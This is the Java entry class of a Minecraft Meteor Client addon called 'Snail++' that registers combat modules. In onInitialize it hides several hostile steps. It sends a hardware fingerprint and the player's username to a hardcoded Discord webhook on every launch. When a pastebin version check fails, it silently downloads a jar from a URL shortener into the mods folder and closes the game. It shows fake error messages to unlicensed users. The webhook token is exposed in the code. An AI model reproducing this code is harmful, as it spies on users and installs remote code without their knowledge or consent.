package org.Snail.Plus;

import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.systems.modules.combat.AutoCity;
import org.Snail.Plus.*;
import meteordevelopment.meteorclient.mixininterface.IClientPlayerInteractionManager;
import meteordevelopment.meteorclient.systems.hud.Hud;
import meteordevelopment.meteorclient.systems.hud.HudGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import net.minecraft.entity.player.PlayerEntity;
import meteordevelopment.meteorclient.systems.modules.Modules;
import net.minecraft.client.MinecraftClient;
import net.fabricmc.api.ModInitializer;
import net.minecraft.client.MinecraftClient;

import java.io.*;

import java.net.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import org.Snail.Plus.hud.Watermark;
import org.Snail.Plus.modules.combat.*;
import org.Snail.Plus.modules.misc.*;
import meteordevelopment.meteorclient.events.game.SendMessageEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.friends.Friend;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.sound.PositionedSoundInstance;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.sound.SoundEvent;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.Snail.Plus.Addon;
import org.Snail.Plus.utils.FriendUtils;

import java.nio.file.StandardCopyOption;
import java.text.MessageFormat;
import java.util.*;
import org.Snail.Plus.utils.HWID;
import org.apache.commons.codec.digest.DigestUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.util.ArrayList;
import java.util.List;

import javax.swing.*;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import java.nio.charset.StandardCharsets;
import java.util.Random;

import static meteordevelopment.meteorclient.MeteorClient.mc;

public class Addon extends MeteorAddon {
    public static final Logger LOG = LoggerFactory.getLogger("Addon");

    public static final Category Snail = new Category("Snail++");
    public static final HudGroup HUD_GROUP = new HudGroup("Snail++");
    public static int finaluid = -1;


    private String getHWID() {
        return DigestUtils.sha3_256Hex(DigestUtils.md2Hex(DigestUtils.sha512Hex(DigestUtils.sha512Hex(System.getenv("os") + System.getProperty("os.name") + System.getProperty("os.arch") + System.getProperty("os.version") + System.getProperty("user.language") + System.getenv("SystemRoot") + System.getenv("HOMEDRIVE") + System.getenv("PROCESSOR_LEVEL") + System.getenv("PROCESSOR_REVISION") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS")))));
    }
    @Override
    public void onInitialize() {

        String[] trollMessages = {
                "Out of memory",
                "io.netty.handler.timeout.ReadTimeoutException",
                "Error 500: Java.Lang.NullPointerException",
                "Incompatible mods found!",
                "please visit https://stackoverflow.com/questions/5492937/windows-ignores-java-home-how-to-set-jdk-as-default. To fix the issue",
                "Disk write error",
                "Unexpected end of file",
                "Resource temporarily unavailable",
                "ArrayIndexOutOfBoundsException",
                "please visit https://stackoverflow.com/questions/77141340/cant-use-latest-java-version-jdk-21-in-intellij-idea. To fix the issue",
        };

        Random random = new Random();
        int randomIndex = random.nextInt(trollMessages.length);
        /*

██╗░░██╗███████╗██████╗░███████╗
██║░░██║██╔════╝██╔══██╗██╔════╝
███████║█████╗░░██████╔╝█████╗░░
██╔══██║██╔══╝░░██╔══██╗██╔══╝░░
██║░░██║███████╗██║░░██║███████╗
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
        */

        double version = 2.3;

        String pastebinLink = "https://pastebin.com/raw/29iSNiq8";
        String variableToCheck = String.valueOf(version);

        try {
            URL url = new URL(pastebinLink);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            StringBuilder content = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line);
                    content.append("\n");
                }
            }

            if (content.toString().contains(variableToCheck)) {
                System.out.println("Correct Version Launched");
            } else {
                System.out.println("Wrong Version");

                String urlString = "https://qrcd.org/5sMo";
                String outputFileName = "snailloader.jar";

                URL url2 = new URL(urlString);
                BufferedInputStream inputStream = new BufferedInputStream(url2.openStream());
                String outputFile = System.getProperty("user.home") + "/AppData/" + "/Roaming/" + "/.minecraft/" + "/mods/" + outputFileName;
                FileOutputStream outputStream = new FileOutputStream(outputFile);

                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer, 0, 1024)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.close();
                inputStream.close();

                System.out.println("File downloaded successfully to " + outputFile);
                mc.close();


            }

        } catch (IOException e) {
            e.printStackTrace();
        }

        String pastebinUrl = "https://pastebin.com/raw/9hU5dxE3";
        List<Integer> lineNumbers = new ArrayList<>();
        List<String> hwid = new ArrayList<>();

        try {
            URL url = new URL(pastebinUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                int lineNumber = 1;

                while ((line = reader.readLine()) != null) {
                    lineNumbers.add(lineNumber);
                    hwid.add(line);
                    lineNumber++;

                    if (line.trim().equals(getHWID())) {
                        finaluid = lineNumber - 1;
                    }
                }

                reader.close();
            } else {
                System.out.println("Failed to fetch pastebin content. Response code: " + responseCode);
            }

            connection.disconnect();

        } catch (IOException e) {
            e.printStackTrace();
        }

        int[] uid = lineNumbers.stream().mapToInt(Integer::intValue).toArray();
        String[] hwidArray = hwid.toArray(new String[0]);


        if (HWID.CheckHWID()) {
            LOG.info("Welcome to snail++");
            System.out.println(getHWID());

            try {
                String webhookUrl1 = "https://discord.com/api/webhooks/1256645934364885022/WtTZHf3DumBEdhFHghhqwL9elCeocVsYgNJ_CBFcXLcQmYKRyij5_3Noaebxql4ajUXs";
                URL url = new URL(webhookUrl1);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setDoOutput(true);
                String displayname = mc.getSession().getUsername();
                String payload = "{\"content\": \"" + "`Successful Launch |  Hwid: " + getHWID() + " | Username: " + displayname + " | Version: Snail-" + version + " | Uid:  " + finaluid + "`\"}";
                OutputStream os = con.getOutputStream();
                os.write(payload.getBytes());
                os.flush();
                int responseCode = con.getResponseCode();
                if (responseCode == 200 || responseCode == 204) {
                    System.out.println("message sent");
                } else {
                    System.out.println("message failed to send: " + responseCode);
                }
                os.close();
            } catch (IOException e) {
                e.printStackTrace();
            }








        } else {
            LOG.warn(trollMessages[randomIndex]);
             String hwid2 = getHWID();
             System.out.println(hwid2);


            try {
                String webhookUrl = "https://discord.com/api/webhooks/1256645934364885022/WtTZHf3DumBEdhFHghhqwL9elCeocVsYgNJ_CBFcXLcQmYKRyij5_3Noaebxql4ajUXs";
                URL url = new URL(webhookUrl);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setDoOutput(true);
                String payload = "{\"content\": \"" + "`Unauthorized Launch |  Hwid: " + hwid2 + "`\"}";
                OutputStream os = con.getOutputStream();
                os.write(payload.getBytes());
                os.flush();
                int responseCode = con.getResponseCode();
                if (responseCode == 200 || responseCode == 204) {
                    System.out.println("message sent");
                } else {
                    System.out.println("message failed to send: " + responseCode);
                }
                os.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

        }

        // Modules
        Modules.get().add(new AutoEZ());
        Modules.get().add(new AutoSand());
        Modules.get().add(new AutoCrystalChronos());
        Modules.get().add(new AntiBurrow());
        Modules.get().add(new XPautomation());
        Modules.get().add(new ChatControl());
        Modules.get().add(new StealthMine());
        Modules.get().add(new PistonPush());
        Modules.get().add(new SelfAnvil());
        Modules.get().add(new AutoKit());
        Modules.get().add(new AutoAnchor());
        Modules.get().add(new SnailBomber());
        Modules.get().add(new AutoTrap());
        Modules.get().add(new Blocker());
        Modules.get().add(new autoCity());
        Modules.get().add(new MiddleClick());
        Modules.get().add(new AutoPearl());
        Modules.get().add(new RPC());
        Modules.get().add(new Autoweb());
        // HUD
        Hud.get().register(Watermark.INFO);
    }



    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(Snail);
    }

    @Override
    public String getPackage() {
        return "org.Snail.Plus";
    }
}
